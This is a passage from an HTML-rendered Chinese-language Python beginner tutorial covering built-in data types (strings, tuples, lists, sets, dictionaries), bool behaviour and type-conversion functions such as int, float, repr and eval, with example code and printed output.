builtin">isinstance</span><span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A<span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A<span class="token punctuation">)</span><span class="token comment"># False</span><span class="token triple-quoted-string string">'''TrueTrueTrueFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="bool值处理"><a href="#bool值处理" class="headerlink" title="bool值处理"></a>bool值处理</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">issubclass</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">False</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">False</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 1</span>var1 <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1 <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment"># False</span>var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span>var2 <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token triple-quoted-string string">'''TrueTrueTrue21FalseFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="删除对象"><a href="#删除对象" class="headerlink" title="删除对象"></a>删除对象</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">del</span> a<span class="token keyword">del</span> var1<span class="token punctuation">,</span>var2<span class="token triple-quoted-string string">'''再次print会报错'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h5><ol><li>除法<code>/</code>返回一个浮点数，<code>//</code>返回一个整数</li><li><code>*</code>乘法，<code>**</code>乘方</li><li><code>%</code>取余</li><li>混合运算时整型转换为浮点型</li><li>复数使用<code>complex(a,b)</code>表示<code>a+bj</code></li></ol><h4 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String(字符串)"></a>String(字符串)</h4><h5 id="字符串截取格式"><a href="#字符串截取格式" class="headerlink" title="字符串截取格式"></a>字符串截取格式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">变量名<span class="token punctuation">[</span>头下标<span class="token punctuation">:</span>尾下标<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从前面索引  0 1 2 3 4 ……</p><p>从后面索引  -1 -2 -3 -4 -5 ……</p><p>从前面截取 :1 2 3 4:</p><p>从后面截取 :-4 -3 -2 -1:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有字符</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第一个到倒数第二个</span><span class="token comment"># tes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token comment"># 输出第三个到第四个</span><span class="token comment"># st</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">'re'</span><span class="token punctuation">)</span><span class="token comment"># testre</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t t</span><span class="token triple-quoted-string string">'''testttesttessttesttesttestret t'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python字符串不能改变，诸如<code>str[n]='?'</code>的赋值会报错</p><h4 id="Tuple-元组"><a href="#Tuple-元组" class="headerlink" title="Tuple(元组)"></a>Tuple(元组)</h4><ol><li>元组元素不能更改</li><li>元组写在小括号内，以<code>,</code>分隔</li><li>各元素类型可以不同</li><li>元组的索引切片操作与string一样</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'dou'</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test2'</span><span class="token punctuation">)</span>tuple3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span>  <span class="token comment"># 单个元素后面加逗号</span>tuple4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 空元组</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple4<span class="token punctuation">)</span><span class="token comment"># ()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple3<span class="token punctuation">)</span><span class="token comment"># (1,)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第一个元素</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第二个到第三个元素</span><span class="token comment"># (1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有元素</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有元素</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第三个及前面的所有</span><span class="token comment"># (1, 1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">+</span> tuple2<span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 'test2')</span><span class="token triple-quoted-string string">'''()(1, 1.2, 'test', 'dou')(1,)1(1.2, 'test')(1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou')(1, 1.2, 'test')(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou', 1, 'test2')'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="可变数据"><a href="#可变数据" class="headerlink" title="可变数据"></a>可变数据</h3><h4 id="List-列表"><a href="#List-列表" class="headerlink" title="List(列表)"></a>List(列表)</h4><ol><li>索引截取方式与元组相同</li><li>截取后成为一个新列表</li><li>元素在打方括号中，以逗号分隔</li><li>列表的元素可改变</li><li>元素可以是元组</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># 输出完整列表</span><span class="token comment"># ['test', 1, 1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出列表第一个元素</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 从第二个开始输出到第三个元素</span><span class="token comment"># [1, 1.2]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出从第三个元素开始的所有元素</span><span class="token comment"># [1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2 <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 输出两次列表</span><span class="token comment"># [1, 'test', 1, 'test']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span> <span class="token operator">+</span> list2<span class="token punctuation">)</span>  <span class="token comment"># 连接列表</span><span class="token comment"># ['test', 1, 1.2, 999, 1, 'test']</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># 修改第一元素</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span>  <span class="token comment"># 修改第三个到第四元素</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 22, 33, 5]</span>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 第一个-1表示从最后一个开始</span><span class="token comment"># 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [4, 3, 2]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [5]</span><span class="token triple-quoted-string string">'''['test', 1, 1.2, 999]test[1, 1.2][1.2, 999][1, 'test', 1, 'test']['test', 1, 1.2, 999, 1, 'test'][1, 2, 3, 4, 5]['test', 2, 3, 4, 5]['test', 2, 22, 33, 5][1, 2, 3, 4, 5][5, 4, 3, 2, 1][4, 3, 2][5]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Set-集合"><a href="#Set-集合" class="headerlink" title="Set(集合)"></a>Set(集合)</h4><p>创建格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parame <span class="token operator">=</span> <span class="token punctuation">{</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> ……<span class="token punctuation">}</span><span class="token keyword">or</span><span class="token builtin">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 创建一个空集合</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">sites <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>sites<span class="token punctuation">)</span>  <span class="token comment"># 输出集合，重复的元素被自动去掉</span><span class="token comment"># {1, '123', 'test'}</span><span class="token comment"># 成员测试</span><span class="token keyword">if</span> <span class="token string">'test'</span> <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test 在集合中'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test 不在集合中'</span><span class="token punctuation">)</span><span class="token comment"># set可以进行集合运算</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的差集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的并集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的交集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 中不同时存在的元素</span><span class="token triple-quoted-string string">'''{1, '123', 'test'}test 在集合中{'a', 'b', 'r', 'c', 'd'}{'b', 'd', 'r'}{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}{'c', 'a'}{'d', 'l', 'r', 'm', 'z', 'b'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Dictionary-字典"><a href="#Dictionary-字典" class="headerlink" title="Dictionary(字典)"></a>Dictionary(字典)</h4><ol><li>字典是无序的，依靠键值对来存取</li><li>字典用<code>{}</code>标识， <code>键(key) : 值(value)</code></li><li><code>key</code>不可变，并且是唯一的</li><li>使用<code>{}</code>创建空字典</li></ol><p>创建字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 空字典</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出2,test的值</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键名</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键值</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token triple-quoted-string string">'''{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd'])'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><h5 id="class-int-x-base-10"><a href="#class-int-x-base-10" class="headerlink" title="class int(x, base=10)"></a><code>class int(x, base=10)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># x为数值型时,不写base,直接取整,x为str时,base为转换前的进制</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3-1118'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-float-x"><a href="#class-float-x" class="headerlink" title="class float([x])"></a><code>class float([x])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将整数和字符串转换成浮点数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1.0-11.212.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-complex-real-imag"><a href="#class-complex-real-imag" class="headerlink" title="class complex([real[, imag]])"></a><code>class complex([real[, imag]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建一个复数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token string">'1+3j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1+0j)(1+2j)(1+3j)(1+2j)'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-str-object"><a href="#class-str-object" class="headerlink" title="class str(object='')"></a><code>class str(object='')</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将对象转化为适于人阅读的形式</span>s <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="repr-object"><a href="#repr-object" class="headerlink" title="repr(object)"></a><code>repr(object)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将对象转化为供解释器读取的形式</span>dad <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>dad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''''test''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="eval-expression-globals-locals"><a href="#eval-expression-globals-locals" class="headerlink" title="eval(expression[, globals[, locals]])"></a><code>eval(expression[, globals[, locals]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 用来执行一个字符串表达式，并返回表达式的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'pow(2,2)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'2 * 2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''44'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="tuple-iterable"><a href="#tuple-iterable" class="headerlink" title="tuple( iterable )"></a><code>tuple( iterable )</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将可迭代系列（如列表）转换为元组</span><span class="token comment"># tuple() 可以将字符串，列表，字典，集合转化为元组</span>list1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token string">'34'</span><span class="token punctuation">,</span> <span class="token string">'56'</span><span class="token punctuation">,</span> <span class="token string">'78'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ('12', '34', '56', '78')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="list-seq"><a href="#list-seq" class="headerlink" title="list( seq )"></a><code>list( seq )</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 用于将元组或字符串转换为列表</span>aTuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>aTuple<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"列表元素 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># [123, 'Google', 'Runoob', 'Taobao']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Hello World"</span>list2<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"列表元素 : "</span><span class="token 